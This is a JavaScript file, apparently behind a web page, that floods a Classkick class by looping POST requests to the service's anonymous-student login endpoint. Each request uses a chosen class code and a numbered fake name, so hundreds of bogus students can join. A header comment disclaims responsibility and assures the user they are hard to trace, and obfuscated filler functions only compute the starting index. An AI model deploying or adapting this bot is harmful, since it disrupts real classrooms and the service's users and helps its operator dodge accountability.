/* 
What EVER you do with this page, is solely your responsibility. 
Your user agent is not sent , therefore the only trackable feature
is your IP Address, and even then, they can't really do much with it.
*/
async function Flood(C, bN, bNNu, evO) {
    var i=evO;
    while (i < parseInt(bNNu)) {
        const resp = await fetch("https://services.classkick.com/v1/users/login/anonymous-student", {
            "body": "{\"class_code\":\""+ C +"\",\"name\":\""+bN+i.toString()+"\"}",
            "method": "POST",
        })
        console.log("{\"class_code\":\""+ C +"\",\"name\":\""+bN+i.toString()+"\"}")
        i++
    }
    
    
    console.log(parseInt(bNNu))
}
async function FCTR(eV, zH) {
    var CC;
    CC = document.getElementById("Cv09").value;
    console.log(CC);
    var Bn;
    Bn = document.getElementById("BnSSEJ92").value;
    console.log(Bn);
    var BnU;
    BnU = document.getElementById("BnU934").value;
    console.log(BnU);

    await Flood(CC,Bn,BnU, eV)

}

function concat(ve, vf) {var Tl = ve;var Th = vf;vf+vf*2+ve;var e;vf+ve;e=Tl;return(e+Th)};function rZ(eds){var ch;ch=((eds)-(6+6));return ch-1};
function fnct(sdfJ){
    var Pn = 0;
    var es = 1;
    es+=sdfJ;
    var em = 2;
    var etc= Pn;
    Pn+=etc;
    etc++;
    etc++;
    Pn=etc;
    Er = etc;
    Pn = Pn**2;
    Er = Er**2;
    Pn+=(Er*2);

    var el;
    var eme;
    var em = 2;
    var etc= Pn;

    

    Pn = Pn-sdfJ;
    Pn++;
    console.log(Pn)
    FCTR(Pn, em)
    return Pn;
};